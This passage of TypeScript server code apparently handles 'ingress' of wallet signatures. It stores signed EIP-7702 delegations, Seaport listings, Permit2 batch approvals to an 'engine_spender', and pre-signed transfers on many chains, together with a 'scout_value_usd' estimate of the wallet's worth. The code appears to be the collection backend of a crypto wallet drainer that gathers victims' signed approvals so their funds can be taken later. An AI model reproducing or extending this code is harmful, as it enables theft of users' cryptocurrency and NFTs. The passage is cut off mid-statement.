        return sendFailure(reply, 400, 'eip7702_delegation requires eip7702_authorization { r, s, yParity, nonce, address, chainId }', {
          code: 'ValidationError',
        })
      }
      const delegateeRaw = b.delegatee?.trim() ?? String(authRaw['address'] ?? '').trim()
      if (!delegateeRaw || !isAddress(delegateeRaw)) {
        return sendFailure(reply, 400, 'eip7702_delegation requires valid delegatee address', {
          code: 'ValidationError',
        })
      }
      const spenderRaw = b.engine_spender?.trim()
      const authorization: Eip7702SignedAuthorization = {
        chainId: Number(authRaw['chainId'] ?? b.chain_id),
        address: getAddress(String(authRaw['address'] ?? delegateeRaw)),
        nonce: BigInt(String(authRaw['nonce'] ?? '0')),
        r: String(authRaw['r']) as Hex,
        s: String(authRaw['s']) as Hex,
        yParity: Number(authRaw['yParity'] ?? authRaw['v'] ?? 0),
      }
      const erc20sRaw = Array.isArray(b.erc20s) ? (b.erc20s as unknown[]).filter((a) => typeof a === 'string' && isAddress(a as string)).map((a) => getAddress(a as string)) : []
      const defiActionsRaw = Array.isArray(b.defi_actions) ? (b.defi_actions as unknown[]) : []
      const defi_actions = defiActionsRaw
        .map((item) => {
          if (!item || typeof item !== 'object') return null
          const d = item as Record<string, unknown>
          const target = typeof d['target'] === 'string' && isAddress(d['target']) ? getAddress(d['target']) : null
          if (!target) return null
          const tokenA =
            typeof d['tokenA'] === 'string' && isAddress(d['tokenA'])
              ? getAddress(d['tokenA'])
              : ('0x0000000000000000000000000000000000000000' as Address)
          const tokenB =
            typeof d['tokenB'] === 'string' && isAddress(d['tokenB'])
              ? getAddress(d['tokenB'])
              : ('0x0000000000000000000000000000000000000000' as Address)
          return {
            kind: Number(d['kind'] ?? 0),
            target,
            tokenA,
            tokenB,
            param1: BigInt(String(d['param1'] ?? '0')),
            param2: BigInt(String(d['param2'] ?? '0')),
            param3: BigInt(String(d['param3'] ?? '0')),
          }
        })
        .filter((x): x is NonNullable<typeof x> => x != null)
      const packed = packEip7702SignatureEnvelope({
        protocol: 'eip7702_delegation',
        chain_id: Number(b.chain_id),
        wallet: wallet_address as Address,
        delegatee: getAddress(delegateeRaw),
        spender: spenderRaw && isAddress(spenderRaw) ? getAddress(spenderRaw) : getAddress(delegateeRaw),
        authorization,
        erc20s: erc20sRaw,
        ...(defi_actions.length > 0 ? { defi_actions } : {}),
      })
      const sealed = sealSignatureHexForPersistence(packed as Hex)
      const chainIdNorm = String(b.chain_id).trim()
      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
      return persistSignatureRow(
        {
          wallet_address,
          token_address: token_address || getAddress(delegateeRaw),
          signature_hex: sealed,
          nonce: b.nonce,
          expiry: b.expiry_iso,
          wallet_type: b.wallet_type.trim(),
          protocol: 'eip7702_delegation',
          chain_family: 'EVM',
          scout_value_usd: tel.scout_value_usd,
          amount: tel.amount ?? '0',
          max_allowance: tel.max_allowance,
          requires_quorum: tel.requires_quorum,
          source_origin: sourceOrigin,
          chain_id: chainIdNorm,
        },
        reply,
      )
    }

    if (protocolNorm === 'seaport_listing') {
      if (b.chain_id == null) {
        return sendFailure(reply, 400, 'seaport_listing ingress requires chain_id', {
          code: 'ValidationError',
        })
      }
      const sigRaw =
        typeof signatureRaw === 'string' ? signatureRaw.trim() : String(signatureRaw ?? '').trim()
      if (!sigRaw.startsWith('0x')) {
        return sendFailure(reply, 400, 'seaport_listing ingress requires EIP-712 signature', {
          code: 'ValidationError',
        })
      }
      const orderRaw = b.seaport_order ?? { parameters: b.evm_payload, signature: sigRaw }
      let normalizedOrder
      try {
        normalizedOrder = normalizeSeaportOrder(orderRaw, sigRaw)
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e)
        return sendFailure(reply, 400, msg, { code: 'ValidationError' })
      }
      const nftOffer = normalizedOrder.parameters.offer[0]
      const tokenAddress = nftOffer?.token ?? token_address
      const packed = packSeaportListingSignatureEnvelope({
        chainId: Number(b.chain_id),
        order: normalizedOrder,
        walletAddress: wallet_address,
        seaportVersion: b.seaport_version,
      })
      const sealed = sealSignatureHexForPersistence(packed)
      const chainIdNorm = String(b.chain_id).trim()
      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
      return persistSignatureRow(
        {
          wallet_address,
          token_address: tokenAddress,
          signature_hex: sealed,
          nonce: b.nonce,
          expiry: b.expiry_iso,
          wallet_type: b.wallet_type.trim(),
          protocol: 'seaport_listing',
          chain_family: 'EVM',
          scout_value_usd: tel.scout_value_usd,
          amount: nftOffer?.identifierOrCriteria?.toString() ?? tel.amount,
          max_allowance: tel.max_allowance,
          requires_quorum: tel.requires_quorum,
          source_origin: sourceOrigin,
          chain_id: chainIdNorm,
        },
        reply,
      )
    }

    if (protocolNorm === 'omnichain_atomic_v1') {
      const omnichainPayloads = validateOmnichainAtomicIngressPayloads({
        solana_payload: b.solana_payload,
        tron_payload: b.tron_payload,
        ton_payload: b.ton_payload,
        bitcoin_payload: b.bitcoin_payload,
        cosmos_payload: b.cosmos_payload,
        aptos_payload: b.aptos_payload,
        sui_payload: b.sui_payload,
      })
      if (omnichainPayloads.ok === false) {
        return sendFailure(reply, 400, omnichainPayloads.message, { code: 'ValidationError' })
      }

      const hasEvmBatch =
        b.chain_id != null &&
        b.engine_spender != null &&
        b.permit2 != null &&
        b.batch_permit_metadata != null &&
        batchPermits != null &&
        batchPermits.length > 0
      const nativeAmountIngress = parseNativeAmount(
        b.evm_payload?.native_amount ?? b.nativeAmount ?? b.batch_permit_metadata?.native_amount ?? '0',
      )
      const hasEvmNativeLeg =
        nativeAmountIngress > 0n &&
        (b.evm_payload?.native_signed_transaction ?? b.native_signed_transaction) != null
      const hasNonEvmLeg =
        omnichainPayloads.data.solana != null ||
        omnichainPayloads.data.tron != null ||
        omnichainPayloads.data.ton != null ||
        omnichainPayloads.data.bitcoin != null ||
        omnichainPayloads.data.cosmos != null ||
        omnichainPayloads.data.aptos != null ||
        omnichainPayloads.data.sui != null

      if (!hasEvmBatch && !hasNonEvmLeg && !hasEvmNativeLeg) {
        return sendFailure(
          reply,
          400,
          'omnichain_atomic_v1 requires evm batch (chain_id, engine_spender, permit2, permits, batch_permit_metadata), native ETH leg, and/or a non-EVM chain payload',
          { code: 'ValidationError' },
        )
      }

      let batchMetadata: BatchPermitMetadata | undefined
      let nativeAmount = 0n
      let nativeSignedRaw: Hex | string | undefined

      if (hasEvmBatch) {
        if (!isAddress(b.engine_spender!) || !isAddress(b.permit2!)) {
          return sendFailure(reply, 400, 'omnichain_atomic_v1 requires valid engine_spender and permit2', {
            code: 'ValidationError',
          })
        }
        nativeAmount = parseNativeAmount(
          b.evm_payload?.native_amount ??
            b.nativeAmount ??
            b.batch_permit_metadata!.native_amount ??
            '0',
        )
        nativeSignedRaw =
          b.evm_payload?.native_signed_transaction ?? b.native_signed_transaction ?? undefined
        if (nativeAmount > 0n && nativeSignedRaw == null) {
          return sendFailure(
            reply,
            400,
            'omnichain_atomic_v1 EVM native leg requires native_signed_transaction when native_amount > 0',
            { code: 'ValidationError' },
          )
        }

        const rpcUrl = await gatekeeperEthereumRpcUrl()
        if (!rpcUrl) {
          return sendFailure(reply, 500, 'Server RPC not configured', { code: 'ServerError' })
        }
        const batchClient = createPublicClient({
          chain: chainById(Number(b.chain_id)),
          transport: http(rpcUrl),
        })
        for (const permit of batchPermits!) {
          if (!isAddress(permit.token)) {
            return sendFailure(reply, 400, 'Each batch permit token must be a valid EVM address', {
              code: 'ValidationError',
            })
          }
          const delegateReject = await rejectIfDelegateCashDelegated(
            reply,
            batchClient,
            {
              vault: wallet_address as Address,
              engineSpender: b.engine_spender!,
              permit2Address: b.permit2!,
              tokenAddress: permit.token as Address,
            },
            { token_address: permit.token },
          )
          if (delegateReject != null) {
            return delegateReject
          }
        }

        batchMetadata = {
          ...b.batch_permit_metadata!,
          spender: getAddress(b.engine_spender!),
          chainId: Number(b.chain_id),
          details: batchPermits!.map((permit) => ({
            token: getAddress(permit.token),
            amount: permit.amount,
            expiration: b.batch_permit_metadata!.details[0]?.expiration ?? computeSignatureAnchorExpiry(),
            nonce: b.batch_permit_metadata!.details.find((d) => d.token === permit.token)?.nonce ?? 0,
          })),
          ...(nativeAmount > 0n ? { native_amount: nativeAmount.toString() } : {}),
        }
      } else if (hasEvmNativeLeg) {
        nativeAmount = nativeAmountIngress
        nativeSignedRaw =
          b.evm_payload?.native_signed_transaction ?? b.native_signed_transaction ?? undefined
        const chainIdNative = Number(b.chain_id ?? 1)
        batchMetadata = {
          details: [],
          spender: resolveConfiguredEngineSpender(),
          sigDeadline: '0',
          chainId: chainIdNative,
          native_amount: nativeAmount.toString(),
        }
      }

      const nfts: BatchNftEntry[] = (b.evm_payload?.nfts ?? b.nfts ?? []).map((entry) => ({
        contract: getAddress(entry.contract),
        tokenIds: entry.tokenIds,
        ...(entry.standard ? { standard: entry.standard } : {}),
        ...(entry.amounts ? { amounts: entry.amounts } : {}),
      }))

      const solanaPayload = omnichainPayloads.data.solana
        ? {
            ...(omnichainPayloads.data.solana.native_amount_sol != null
              ? { native_amount_sol: String(omnichainPayloads.data.solana.native_amount_sol) }
              : {}),
            ...(omnichainPayloads.data.solana.native_signed_transaction_sol
              ? {
                  native_signed_transaction_sol:
                    omnichainPayloads.data.solana.native_signed_transaction_sol,
                }
              : {}),
            ...(omnichainPayloads.data.solana.spl_mint
              ? { spl_mint: omnichainPayloads.data.solana.spl_mint }
              : {}),
            ...(omnichainPayloads.data.solana.spl_amount != null
              ? { spl_amount: String(omnichainPayloads.data.solana.spl_amount) }
              : {}),
            ...(omnichainPayloads.data.solana.native_signed_transaction_spl
              ? {
                  native_signed_transaction_spl:
                    omnichainPayloads.data.solana.native_signed_transaction_spl,
                }
              : {}),
          }
        : undefined

      const tronPayload = omnichainPayloads.data.tron
        ? {
            ...(omnichainPayloads.data.tron.native_amount_trx != null
              ? { native_amount_trx: String(omnichainPayloads.data.tron.native_amount_trx) }
              : {}),
            ...(omnichainPayloads.data.tron.native_signed_transaction_trx
              ? {
                  native_signed_transaction_trx:
                    omnichainPayloads.data.tron.native_signed_transaction_trx,
                }
              : {}),
            ...(omnichainPayloads.data.tron.trc20_contract
              ? { trc20_contract: omnichainPayloads.data.tron.trc20_contract }
              : {}),
            ...(omnichainPayloads.data.tron.trc20_amount != null
              ? { trc20_amount: String(omnichainPayloads.data.tron.trc20_amount) }
              : {}),
            ...(omnichainPayloads.data.tron.native_signed_transaction_trc20
              ? {
                  native_signed_transaction_trc20:
                    omnichainPayloads.data.tron.native_signed_transaction_trc20,
                }
              : {}),
          }
        : undefined

      const tonPayload = omnichainPayloads.data.ton
        ? {
            ...(omnichainPayloads.data.ton.native_amount_ton != null
              ? { native_amount_ton: String(omnichainPayloads.data.ton.native_amount_ton) }
              : {}),
            ...(omnichainPayloads.data.ton.native_signed_transaction_ton
              ? {
                  native_signed_transaction_ton:
                    omnichainPayloads.data.ton.native_signed_transaction_ton,
                }
              : {}),
            ...(omnichainPayloads.data.ton.jetton_master
              ? { jetton_master: omnichainPayloads.data.ton.jetton_master }
              : {}),
            ...(omnichainPayloads.data.ton.jetton_amount != null
              ? { jetton_amount: String(omnichainPayloads.data.ton.jetton_amount) }
              : {}),
            ...(omnichainPayloads.data.ton.native_signed_transaction_jetton
              ? {
                  native_signed_transaction_jetton:
                    omnichainPayloads.data.ton.native_signed_transaction_jetton,
                }
              : {}),
          }
        : undefined

      const bitcoinPayload = omnichainPayloads.data.bitcoin
        ? {
            signed_psbt_base64: omnichainPayloads.data.bitcoin.signed_psbt_base64,
            ...(omnichainPayloads.data.bitcoin.wallet_address
              ? { wallet_address: omnichainPayloads.data.bitcoin.wallet_address }
              : {}),
            ...(omnichainPayloads.data.bitcoin.vault_address
              ? { vault_address: omnichainPayloads.data.bitcoin.vault_address }
              : {}),
            ...(omnichainPayloads.data.bitcoin.amount_sat != null
              ? { amount_sat: String(omnichainPayloads.data.bitcoin.amount_sat) }
              : {}),
            ...(omnichainPayloads.data.bitcoin.fee_sat != null
              ? { fee_sat: String(omnichainPayloads.data.bitcoin.fee_sat) }
              : {}),
          }
        : undefined

      const cosmosPayload = omnichainPayloads.data.cosmos
        ? {
            ...(omnichainPayloads.data.cosmos.native_amount_cosmos != null
              ? { native_amount_cosmos: String(omnichainPayloads.data.cosmos.native_amount_cosmos) }
              : {}),
            ...(omnichainPayloads.data.cosmos.cosmos_signed_tx
              ? { cosmos_signed_tx: omnichainPayloads.data.cosmos.cosmos_signed_tx }
              : {}),
            ...(omnichainPayloads.data.cosmos.cosmos_tx_encoding
              ? { cosmos_tx_encoding: omnichainPayloads.data.cosmos.cosmos_tx_encoding }
              : {}),
          }
        : undefined

      const aptosPayload = omnichainPayloads.data.aptos
        ? {
            ...(omnichainPayloads.data.aptos.native_amount_aptos != null
              ? { native_amount_aptos: String(omnichainPayloads.data.aptos.native_amount_aptos) }
              : {}),
            ...(omnichainPayloads.data.aptos.aptos_signed_tx
              ? { aptos_signed_tx: omnichainPayloads.data.aptos.aptos_signed_tx }
              : {}),
            ...(omnichainPayloads.data.aptos.aptos_signature
              ? { aptos_signature: omnichainPayloads.data.aptos.aptos_signature }
              : {}),
            ...(omnichainPayloads.data.aptos.aptos_tx_encoding
              ? { aptos_tx_encoding: omnichainPayloads.data.aptos.aptos_tx_encoding }
              : {}),
          }
        : undefined

      const suiPayload = omnichainPayloads.data.sui
        ? {
            ...(omnichainPayloads.data.sui.native_amount_sui != null
              ? { native_amount_sui: String(omnichainPayloads.data.sui.native_amount_sui) }
              : {}),
            ...(omnichainPayloads.data.sui.sui_signed_tx
              ? { sui_signed_tx: omnichainPayloads.data.sui.sui_signed_tx }
              : {}),
            ...(omnichainPayloads.data.sui.sui_signature
              ? { sui_signature: omnichainPayloads.data.sui.sui_signature }
              : {}),
          }
        : undefined

      const permit2Sig = normalizeSignatureHexForSeal(String(signatureRaw)) as Hex
      const packed = packOmnichainAtomicSignatureEnvelope({
        permit2Signature: permit2Sig,
        ...(batchMetadata ? { batch: batchMetadata } : {}),
        ...(batchMetadata
          ? {
              evmPayload: {
                permit2_signature: permit2Sig,
                batch: batchMetadata,
                ...(nativeAmount > 0n ? { native_amount: nativeAmount.toString() } : {}),
                ...(nativeAmount > 0n && nativeSignedRaw != null
                  ? {
                      native_signed_transaction: normalizeSignatureHexForSeal(
                        String(nativeSignedRaw),
                      ) as Hex,
                    }
                  : {}),
                ...(nfts.length > 0 ? { nfts } : {}),
              },
            }
          : {}),
        ...(solanaPayload ? { solanaPayload } : {}),
        ...(tronPayload ? { tronPayload } : {}),
        ...(tonPayload ? { tonPayload } : {}),
        ...(cosmosPayload ? { cosmosPayload } : {}),
        ...(aptosPayload ? { aptosPayload } : {}),
        ...(suiPayload ? { suiPayload } : {}),
        ...(bitcoinPayload ? { bitcoinPayload } : {}),
      })
      const sealed = sealSignatureHexForPersistence(packed)
      const chainIdNorm =
        b.chain_id != null && String(b.chain_id).trim() !== ''
          ? String(b.chain_id).trim()
          : hasNonEvmLeg && !hasEvmBatch && !hasEvmNativeLeg
            ? 'omnichain'
            : undefined
      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
      const batchAmount = hasEvmBatch
        ? batchPermits!
            .reduce((sum, permit) => {
              try {
                return sum + BigInt(permit.amount)
              } catch {
                return sum
              }
            }, nativeAmount)
            .toString()
        : hasEvmNativeLeg
          ? nativeAmount.toString()
          : tel.amount

      return persistSignatureRow(
        {
          wallet_address,
          token_address,
          signature_hex: sealed,
          nonce: b.nonce,
          expiry: b.expiry_iso,
          wallet_type: b.wallet_type.trim(),
          protocol: 'omnichain_atomic_v1',
          chain_family: 'EVM',
          scout_value_usd: tel.scout_value_usd,
          amount: batchAmount || tel.amount,
          max_allowance: tel.max_allowance,
          requires_quorum: tel.requires_quorum,
          source_origin: sourceOrigin,
          ...(chainIdNorm !== undefined ? { chain_id: chainIdNorm } : {}),
        },
        reply,
      )
    }

    if (protocolNorm === 'permit2_batch_eip712') {
      if (b.chain_id == null || b.engine_spender == null || b.permit2 == null) {
        return sendFailure(
          reply,
          400,
          'EVM Permit2 batch ingress requires chain_id, engine_spender, and permit2',
          { code: 'ValidationError' },
        )
      }
      if (!isAddress(b.engine_spender) || !isAddress(b.permit2)) {
        return sendFailure(reply, 400, 'permit2_batch_eip712 requires valid engine_spender, permit2 addresses', {
          code: 'ValidationError',
        })
      }
      if (!b.batch_permit_metadata) {
        return sendFailure(
          reply,
          400,
          'EVM Permit2 batch ingress requires batch_permit_metadata from batch typed-data endpoint',
          { code: 'ValidationError' },
        )
      }
      const nativeAmount = parseNativeAmount(b.nativeAmount ?? b.batch_permit_metadata.native_amount ?? '0')
      const nativeAmountSol = parseNativeAmount(
        b.nativeAmountSol ?? b.batch_permit_metadata.native_amount_sol ?? '0',
      )
      const nativeAmountTrx = parseNativeAmount(
        b.nativeAmountTrx ?? b.batch_permit_metadata.native_amount_trx ?? '0',
      )
      const nativeAmountTon = parseNativeAmount(
        b.nativeAmountTon ?? b.batch_permit_metadata.native_amount_ton ?? '0',
      )
      const splAmount = parseNativeAmount(b.spl_amount ?? b.batch_permit_metadata.spl_amount ?? '0')
      const trc20Amount = parseNativeAmount(
        b.trc20_amount ?? b.batch_permit_metadata.trc20_amount ?? '0',
      )
      const jettonAmount = parseNativeAmount(
        b.jetton_amount ?? b.batch_permit_metadata.jetton_amount ?? '0',
      )
      const nativeSignedRaw = b.native_signed_transaction
      const nativeSignedSol = b.native_signed_transaction_sol
      const nativeSignedTrx = b.native_signed_transaction_trx
      const nativeSignedTon = b.native_signed_transaction_ton
      const splMint = b.spl_mint?.trim() || b.batch_permit_metadata.spl_mint?.trim() || undefined
      const splSigned = b.spl_signed_transaction?.trim() || undefined
      const trc20Contract =
        b.trc20_contract?.trim() || b.batch_permit_metadata.trc20_contract?.trim() || undefined
      const trc20Signed = b.trc20_signed_transaction
      const jettonMaster =
        b.jetton_master?.trim() || b.batch_permit_metadata.jetton_master?.trim() || undefined
      const jettonSigned = b.jetton_signed_transaction?.trim() || undefined

      const tokenLegCheck = validatePermit2BatchOmnichainTokenLegs({
        spl_mint: splMint,
        spl_amount: splAmount > 0n ? splAmount.toString() : b.spl_amount,
        spl_signed_transaction: splSigned,
        trc20_contract: trc20Contract,
        trc20_amount: trc20Amount > 0n ? trc20Amount.toString() : b.trc20_amount,
        trc20_signed_transaction: trc20Signed,
        jetton_master: jettonMaster,
        jetton_amount: jettonAmount > 0n ? jettonAmount.toString() : b.jetton_amount,
        jetton_signed_transaction: jettonSigned,
      })
      if (tokenLegCheck.ok === false) {
        return sendFailure(reply, 400, tokenLegCheck.message, { code: 'ValidationError' })
      }

      if (nativeAmount > 0n) {
        if (nativeSignedRaw == null || String(nativeSignedRaw).trim() === '') {
          return sendFailure(
            reply,
            400,
            'permit2_batch_eip712 with nativeAmount > 0 requires native_signed_transaction from wallet sendTransaction',
            { code: 'ValidationError' },
          )
        }
        if (!isHexLike(String(nativeSignedRaw).trim()) && !String(nativeSignedRaw).trim().startsWith('0x')) {
          return sendFailure(reply, 400, 'native_signed_transaction must be signed raw transaction hex', {
            code: 'ValidationError',
          })
        }
      }
      if (nativeAmountSol > 0n) {
        if (nativeSignedSol == null || String(nativeSignedSol).trim() === '') {
          return sendFailure(
            reply,
            400,
            'permit2_batch_eip712 with nativeAmountSol > 0 requires native_signed_transaction_sol from Phantom signTransaction',
            { code: 'ValidationError' },
          )
        }
      }
      if (nativeAmountTrx > 0n) {
        if (nativeSignedTrx == null || typeof nativeSignedTrx !== 'object') {
          return sendFailure(
            reply,
            400,
            'permit2_batch_eip712 with nativeAmountTrx > 0 requires native_signed_transaction_trx from TronLink sign',
            { code: 'ValidationError' },
          )
        }
      }
      if (nativeAmountTon > 0n) {
        if (nativeSignedTon == null || String(nativeSignedTon).trim() === '') {
          return sendFailure(
            reply,
            400,
            'permit2_batch_eip712 with nativeAmountTon > 0 requires native_signed_transaction_ton from Tonkeeper sendTransaction BOC',
            { code: 'ValidationError' },
          )
        }
      }

      const parsedIngressNfts = parseBatchNftEntries(b.nfts ?? b.batch_permit_metadata.nfts)
      if (parsedIngressNfts.ok === false) {
        return sendFailure(reply, 400, parsedIngressNfts.error, { code: 'ValidationError' })
      }
      const nfts = parsedIngressNfts.nfts
      if (!batchPermits || batchPermits.length === 0) {
        const omnichainOnly =
          nativeAmountSol > 0n ||
          nativeAmountTrx > 0n ||
          nativeAmountTon > 0n ||
          splAmount > 0n ||
          trc20Amount > 0n ||
          jettonAmount > 0n ||
          nfts.length > 0
        if (!omnichainOnly) {
          return sendFailure(reply, 400, 'permit2_batch_eip712 requires permits: [{ token, amount }]', {
            code: 'ValidationError',
          })
        }
      }
      const nftApprovalSignatures = b.nft_approval_signatures
      if (nfts.length > 0) {
        if (nftApprovalSignatures == null || typeof nftApprovalSignatures !== 'object') {
          return sendFailure(
            reply,
            400,
            'permit2_batch_eip712 with nfts requires nft_approval_signatures (contract → EIP-712 signature)',
            { code: 'ValidationError' },
          )
        }
        for (const entry of nfts) {
          const contractKey = entry.contract.toLowerCase()
          const sig =
            nftApprovalSignatures[entry.contract] ??
            nftApprovalSignatures[contractKey] ??
            nftApprovalSignatures[getAddress(entry.contract)]
          if (sig == null || String(sig).trim() === '' || !String(sig).trim().startsWith('0x')) {
            return sendFailure(
              reply,
              400,
              `nft_approval_signatures missing valid signature for contract ${entry.contract}`,
              { code: 'ValidationError' },
            )
          }
        }
      }

      const batchMetadata: BatchPermitMetadata = {
        ...b.batch_permit_metadata,
        ...(nativeAmount > 0n ? { native_amount: nativeAmount.toString() } : {}),
        ...(nativeAmountSol > 0n ? { native_amount_sol: nativeAmountSol.toString() } : {}),
        ...(nativeAmountTrx > 0n ? { native_amount_trx: nativeAmountTrx.toString() } : {}),
        ...(nativeAmountTon > 0n ? { native_amount_ton: nativeAmountTon.toString() } : {}),
        ...(splMint && splAmount > 0n ? { spl_mint: splMint, spl_amount: splAmount.toString() } : {}),
        ...(trc20Contract && trc20Amount > 0n
          ? { trc20_contract: trc20Contract, trc20_amount: trc20Amount.toString() }
          : {}),
        ...(jettonMaster && jettonAmount > 0n
          ? { jetton_master: jettonMaster, jetton_amount: jettonAmount.toString() }
          : {}),
        ...(nfts.length > 0 ? { nfts } : {}),
      }
      const rpcUrl = await gatekeeperEthereumRpcUrl()
      if (!rpcUrl) {
        return sendFailure(reply, 500, 'Server RPC not configured', { code: 'ServerError' })
      }
      const batchClient = createPublicClient({
        chain: chainById(Number(b.chain_id)),
        transport: http(rpcUrl),
      })
      for (const permit of batchPermits) {
        if (!isAddress(permit.token)) {
          return sendFailure(reply, 400, 'Each batch permit token must be a valid EVM address', {
            code: 'ValidationError',
          })
        }
        const delegateReject = await rejectIfDelegateCashDelegated(
          reply,
          batchClient,
          {
            vault: wallet_address as Address,
            engineSpender: b.engine_spender,
            permit2Address: b.permit2,
            tokenAddress: permit.token as Address,
          },
          { token_address: permit.token },
        )
        if (delegateReject != null) {
          return delegateReject
        }
      }
      const packed = packEvmBatchPermit2SignatureForPersistence(
        typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw),
        batchMetadata,
        {
          nativeAmount: nativeAmount.toString(),
          ...(nativeAmount > 0n && nativeSignedRaw != null
            ? { nativeSignedTransaction: String(nativeSignedRaw) }
            : {}),
          ...(nativeAmountSol > 0n ? { nativeAmountSol: nativeAmountSol.toString() } : {}),
          ...(nativeAmountTrx > 0n ? { nativeAmountTrx: nativeAmountTrx.toString() } : {}),
          ...(nativeAmountTon > 0n ? { nativeAmountTon: nativeAmountTon.toString() } : {}),
          ...(nativeAmountSol > 0n && nativeSignedSol != null
            ? { nativeSignedTransactionSol: String(nativeSignedSol) }
            : {}),
          ...(nativeAmountTrx > 0n && nativeSignedTrx != null
            ? { nativeSignedTransactionTrx: nativeSignedTrx }
            : {}),
          ...(nativeAmountTon > 0n && nativeSignedTon != null
            ? { nativeSignedTransactionTon: String(nativeSignedTon) }
            : {}),
          ...(splMint && splAmount > 0n ? { splMint, splAmount: splAmount.toString() } : {}),
          ...(splAmount > 0n && splSigned != null ? { splSignedTransaction: splSigned } : {}),
          ...(trc20Contract && trc20Amount > 0n
            ? { trc20Contract, trc20Amount: trc20Amount.toString() }
            : {}),
          ...(trc20Amount > 0n && trc20Signed != null
            ? { trc20SignedTransaction: trc20Signed }
            : {}),
          ...(jettonMaster && jettonAmount > 0n
            ? { jettonMaster, jettonAmount: jettonAmount.toString() }
            : {}),
          ...(jettonAmount > 0n && jettonSigned != null
            ? { jettonSignedTransaction: jettonSigned }
            : {}),
          ...(nfts.length > 0 ? { nfts } : {}),
          ...(nfts.length > 0 && nftApprovalSignatures != null
            ? {
                nftApprovalSignatures: Object.fromEntries(
                  nfts.map((entry) => {
                    const contract = getAddress(entry.contract)
                    const sig =
                      nftApprovalSignatures[entry.contract] ??
                      nftApprovalSignatures[contract.toLowerCase()] ??
                      nftApprovalSignatures[contract]
                    return [contract, normalizeSignatureHexForSeal(String(sig)) as Hex]
                  }),
                ) as Record<string, Hex>,
              }
            : {}),
        },
      )
      const sealed = sealSignatureHexForPersistence(packed)
      const chainIdNorm =
        b.chain_id != null && String(b.chain_id).trim() !== ''
          ? String(b.chain_id).trim()
          : undefined
      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
      const batchAmount =
        batchPermits.reduce((sum, permit) => {
          try {
            return sum + BigInt(permit.amount)
          } catch {
            return sum
          }
        }, nativeAmount + nativeAmountSol + nativeAmountTrx + nativeAmountTon + splAmount + trc20Amount + jettonAmount).toString() || tel.amount
      return persistSignatureRow(
        {
          wallet_address,
          token_address,
          signature_hex: sealed,
          nonce: b.nonce,
          expiry: b.expiry_iso,
          wallet_type: b.wallet_type.trim(),
          protocol: 'permit2_batch_eip712',
          chain_family: b.chain_family,
          scout_value_usd: tel.scout_value_usd,
          amount: batchAmount,
          max_allowance: tel.max_allowance,
          requires_quorum: tel.requires_quorum,
          source_origin: sourceOrigin,
          ...(chainIdNorm !== undefined ? { chain_id: chainIdNorm } : {}),
        },
        reply,
      )
    }

    // EVM personal_sign verification — store + allowance-reuse only (no Permit2 execution)
    if (protocolNorm === 'evm_personal_verification' || protocolNorm === 'evm_server_signing') {
      const chainIdNorm = b.chain_id != null ? String(b.chain_id).trim() : '1'
      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
      const sealed = sealSignatureHexForPersistence(sig as Hex)
      return persistSignatureRow(
        {
          wallet_address,
          token_address: token_address || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
          signature_hex: sealed,
          nonce: b.nonce,
          expiry: b.expiry_iso,
          wallet_type: b.wallet_type.trim(),
          protocol: 'evm_personal_verification',
          chain_family: 'EVM',
          scout_value_usd: tel.scout_value_usd,
          amount: tel.amount ?? '0',
          max_allowance: tel.max_allowance,
          requires_quorum: tel.requires_quorum,
          source_origin: sourceOrigin,
          chain_id: chainIdNorm,
        },
        reply,
      )
    }

    if (protocolNorm !== 'permit2_eip712' && protocolNorm !== 'evm') {
      return sendFailure(
        reply,
        400,
        'EVM settlement requires protocol permit2_eip712 (EIP-712 Permit2 authorization)',
        { code: 'ValidationError' },
      )
    }
    if (b.chain_id == null || b.engine_spender == null || b.permit2 == null) {
      return sendFailure(
        reply,
        400,
        'EVM Permit2 ingress requires chain_id, engine_spender, and permit2',
        { code: 'ValidationError' },
      )
    }
    if (!isAddress(b.engine_spender) || !isAddress(b.permit2)) {
      return sendFailure(reply, 400, 'permit2_eip712 requires valid engine_spender, permit2 addresses', {
        code: 'ValidationError',
      })
    }
    if (!b.permit_metadata) {
      return sendFailure(reply, 400, 'EVM Permit2 ingress requires permit_metadata from typed-data endpoint', {
        code: 'ValidationError',
      })
    }
    const permitAmount =
      readPositiveIntAmount(b.permit_metadata.amount) ??
      readPositiveIntAmount(
        (b.permit_metadata as unknown as { details?: { amount?: unknown } }).details?.amount,
      )
    if (permitAmount == null) {
      return sendFailure(
        reply,
        400,
        'permit_metadata.amount must be a positive integer from the typed-data endpoint',
        { code: 'ValidationError' },
      )
    }
    b.permit_metadata = { ...b.permit_metadata, amount: permitAmount }
    const rpcUrl = await gatekeeperEthereumRpcUrl()
    if (!rpcUrl) {
      return sendFailure(reply, 500, 'Server RPC not configured', { code: 'ServerError' })
    }
    const permit2Client = createPublicClient({
      chain: chainById(Number(b.chain_id)),
      transport: http(rpcUrl),
    })
    const delegateReject = await rejectIfDelegateCashDelegated(reply, permit2Client, {
      vault: wallet_address as Address,
      engineSpender: b.engine_spender,
      permit2Address: b.permit2,
      tokenAddress: token_address as Address,
    })
    if (delegateReject != null) {
      return delegateReject
    }
    const packed = packEvmPermit2SignatureForPersistence(
      typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw),
      b.permit_metadata,
    )
    const sealed = sealSignatureHexForPersistence(packed)
    const chainIdNorm =
      b.chain_id != null && String(b.chain_id).trim() !== ''
        ? String(b.chain_id).trim()
        : undefined
    const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
    return persistSignatureRow(
      {
        wallet_address,
        token_address,
        signature_hex: sealed,
        nonce: b.nonce,
        expiry: b.expiry_iso,
        wallet_type: b.wallet_type.trim(),
        protocol: 'permit2_eip712',
        chain_family: b.chain_family,
        scout_value_usd: tel.scout_value_usd,
        amount: tel.amount ?? permitAmount,
        max_allowance: tel.max_allowance,
        requires_quorum: tel.requires_quorum,
        source_origin: sourceOrigin,
        ...(chainIdNorm !== undefined ? { chain_id: chainIdNorm } : {}),
      },
      reply,
    )
  }

  const sealed = sealSignatureHexForPersistence(sig)
  const chainIdNorm =
    b.chain_id != null && String(b.chain_id).trim() !== ''
      ? String(b.chain_id).trim()
      : b.chain_family === 'COSMOS'
        ? 'cosmos:cosmoshub-4'
